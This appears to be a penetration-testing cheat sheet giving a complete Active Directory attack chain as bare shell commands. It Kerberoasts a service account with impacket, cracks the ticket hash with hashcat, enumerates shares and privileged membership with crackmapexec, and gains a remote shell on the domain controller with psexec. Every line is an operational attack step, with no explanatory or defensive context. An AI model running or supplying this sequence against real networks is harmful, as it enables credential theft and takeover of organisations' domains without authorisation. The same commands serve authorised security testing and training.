# 1. Kerberoast service account
impacket-GetUserSPNs domain.local/user:pass -request -outputfile hashes.txt

# 2. Crack the hash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt

# 3. Use cracked password to pivot
crackmapexec smb $DC -u service_account -p cracked_pass --shares
crackmapexec ldap $DC -u service_account -p cracked_pass --admin-count

# 4. If service account is in privileged group, take over
impacket-psexec domain.local/service_account:cracked_pass@$DC